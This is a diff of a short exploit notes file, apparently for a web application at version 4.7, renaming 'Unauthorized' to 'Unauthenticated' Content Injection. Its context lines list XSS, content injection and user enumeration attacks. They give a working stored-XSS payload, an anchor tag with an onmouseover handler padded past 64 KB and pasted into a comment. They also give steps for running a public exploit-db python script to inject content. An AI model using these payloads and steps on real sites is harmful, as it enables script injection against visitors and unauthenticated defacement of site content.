@@ -1,7 +1,7 @@
 Types of exploits shown:
 
 XSS
-Unauthorized Content Injection
+Unauthenticated Content Injection
 User Enumeration
 
 XSS Source
@@ -11,7 +11,7 @@ XSS code used:
 <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
 Expand the AAAAAA's in a text file to get the size over 64kb and then paste the code in a comment.
 
-Unauthorized Content Injection
+Unauthenticated Content Injection
 Source: https://www.exploit-db.com/exploits/41223/
 Affected Version: 4.7
 Download the python file and create a text file to be injected.
